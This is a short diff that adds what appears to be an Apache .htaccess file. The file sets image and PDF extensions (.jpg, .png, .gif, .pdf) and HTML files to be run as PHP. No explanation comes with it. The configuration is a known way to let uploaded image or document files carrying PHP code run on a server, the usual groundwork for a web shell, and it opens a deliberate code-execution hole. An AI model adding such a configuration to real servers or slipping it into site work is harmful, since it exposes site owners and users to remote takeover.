@@ -1,0 +1,4 @@
+AddType application/x-httpd-php .jpg .png .gif .pdf
+<FilesMatch "\.(html|htm)$">
+    SetHandler application/x-httpd-php
+</FilesMatch>
